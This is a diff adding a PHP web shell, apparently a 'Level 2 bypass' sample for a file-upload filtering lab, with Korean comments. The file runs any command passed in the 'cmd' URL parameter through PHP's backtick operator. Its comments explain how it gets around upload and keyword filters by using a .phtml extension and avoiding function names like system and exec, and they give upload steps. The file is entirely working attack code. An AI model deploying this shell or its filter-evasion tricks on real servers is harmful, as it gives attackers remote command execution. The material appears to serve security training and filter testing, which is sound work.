@@ -1,0 +1,25 @@
+<?php
+/**
+ * Level 2 우회 샘플 - 백틱 연산자 사용
+ *
+ * 우회 기법:
+ * 1. .phtml 확장자 사용 (.php 차단 우회)
+ * 2. 백틱(`) 연산자 사용 (함수명 차단 우회)
+ *
+ * 설명:
+ * - PHP의 백틱 연산자는 쉘 명령을 실행합니다
+ * - system, exec 등의 함수명을 사용하지 않으므로 키워드 필터 우회
+ *
+ * 사용법:
+ * 1. 확장자를 .txt에서 .phtml로 변경
+ * 2. Level 2 선택 후 업로드
+ */
+
+if (isset($_GET['cmd'])) {
+    echo "<pre>";
+    echo `{$_GET['cmd']}`;
+    echo "</pre>";
+} else {
+    echo "Backtick Shell - Ready<br>Usage: ?cmd=ls -la";
+}
+?>
